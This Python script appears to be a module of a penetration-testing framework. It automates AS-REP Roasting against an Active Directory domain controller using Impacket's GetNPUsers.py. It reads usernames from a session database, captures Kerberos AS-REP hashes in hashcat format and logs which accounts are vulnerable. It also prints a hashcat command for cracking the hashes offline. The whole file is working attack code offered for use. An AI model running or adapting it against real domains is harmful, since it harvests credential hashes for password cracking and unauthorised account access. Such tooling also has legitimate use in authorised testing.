#!/usr/bin/env python3
import sys
import os
import argparse
import subprocess

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager, Credential
from core.logger import setup_logger, get_logger

logger = None

def run_asreproast(session_dir, domain, dc_ip, username_file=None):
    global logger
    setup_logger("asreproast", session_dir)
    logger = get_logger("asreproast")
    
    db_path = os.path.join(session_dir, "session.db")
    db = DatabaseManager(db_path)
    
    logger.info(f"Starting AS-REP Roasting against {domain}")
    
    # Get usernames from DB if not provided
    if not username_file:
        session = db.get_session()
        creds = session.query(Credential).filter_by(domain=domain).all()
        usernames = [c.username for c in creds if c.username]
        session.close()
        
        if not usernames:
            logger.warning("No usernames enumerated. Trying null authentication...")
            usernames = None
        else:
            # Write to temp file
            username_file = os.path.join(session_dir, "users_asrep.txt")
            with open(username_file, 'w') as f:
                f.write('\n'.join(usernames))
            logger.info(f"Testing {len(usernames)} users for AS-REP roasting")
    
    # Output file
    hash_file = os.path.join(session_dir, "asrep_hashes.txt")
    
    # GetNPUsers.py command (Impacket)
    cmd = [
        "GetNPUsers.py",
        f"{domain}/",
        "-dc-ip", dc_ip,
        "-no-pass",
        "-format", "hashcat",
        "-outputfile", hash_file
    ]
    
    if username_file:
        cmd.extend(["-usersfile", username_file])
    
    try:
        logger.info("Running GetNPUsers.py...")
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=120
        )
        
        logger.debug(result.stdout)
        
        if result.returncode == 0 or "krb5asrep" in result.stdout.lower():
            logger.info(f"AS-REP hashes saved to {hash_file}")
            
            # Count hashes
            if os.path.exists(hash_file):
                with open(hash_file, 'r') as f:
                    hash_count = sum(1 for line in f if line.startswith('$krb5asrep$'))
                logger.info(f"Captured {hash_count} AS-REP hashes")
                
                # Store usernames in DB for tracking
                with open(hash_file, 'r') as f:
                    for line in f:
                        if line.startswith('$krb5asrep$'):
                            try:
                                # Format: $krb5asrep$23$user@DOMAIN:hash...
                                username = line.split('$')[3].split('@')[0]
                                logger.info(f"Found vulnerable user: {username}")
                                db.add_credential(
                                    username=username,
                                    domain=domain,
                                    source="asreproast",
                                    type="asrep_hash"
                                )
                            except:
                                pass
            
            logger.info("Run hashcat to crack: hashcat -m 18200 asrep_hashes.txt wordlist.txt")
        else:
            logger.info("No AS-REP roastable accounts found")
            
    except FileNotFoundError:
        logger.error("GetNPUsers.py not found. Install Impacket: pip3 install impacket")
    except subprocess.TimeoutExpired:
        logger.error("GetNPUsers timed out")
    except Exception as e:
        logger.error(f"Error during AS-REP roasting: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--dc-ip", required=True)
    parser.add_argument("--username-file", help="File with usernames")
    args = parser.parse_args()
    
    run_asreproast(args.session_dir, args.domain, args.dc_ip, args.username_file)
